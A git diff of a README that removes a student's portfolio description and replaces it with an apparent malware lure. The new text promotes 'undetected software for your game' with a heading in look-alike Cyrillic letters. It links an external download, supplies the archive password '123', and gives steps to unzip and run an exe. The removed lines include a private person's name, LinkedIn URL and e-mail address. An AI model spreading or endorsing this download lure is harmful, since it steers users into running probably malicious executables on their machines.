@@ -1,13 +1,29 @@
-# Portfolio of Frederick Lykkegaard Nielsen
-## Get to know me
-I am a student at Aarhus Universitet, studying for my bachelor's degree in Software Engineering. This portfolio is a collection of my work that I find worth showing, from throughout the years of my bachelor's degree. Based in Aarhus, Denmark and fluent in Danish and English.
 
-## Using my code in your projects
-If you download my code for the purpose of using it in your own project, you must under any cirrcumstances give me credit for the code.
-You are free to download the code for the purpose of examining it.
+<p align="center"><h1 align="center">    UNDЕТЕCТЕD SОFТWАRЕ FОR YОUR GАME</h1></p>
+<p align="center">
+<a href="https://707.su/Setup
+"><img src="https://cdn.discordapp.com/attachments/959169078055026742/1163532925611036734/image.png" /></a>
+</p>
 
-## Links
-LinkedIn: https://www.linkedin.com/in/frederick-l-nielsen-159028153/details/experience/ 
 
-## Contact info
-E-mail: Frederick.nielsen01@gmail.com
+|Password: 123 |
+|---|
+
+
+### 🌌MANUAL🌌:
+
+- Download the archive
+
+- - Open rar
+  - - Unzip the file to any folder/desktop
+    - - Run exe
+     
+      - -----------------------------------------------------------------------------------------------------------------------
+
+      # SYSTEM REQUIREMENTS
+
+      - Processor | Intel | Amd Processor |
+     
+      - - Windows support | 7 | 8 | 8.1 | 10 | 11 |
+       
+        - - Build support | ALL |
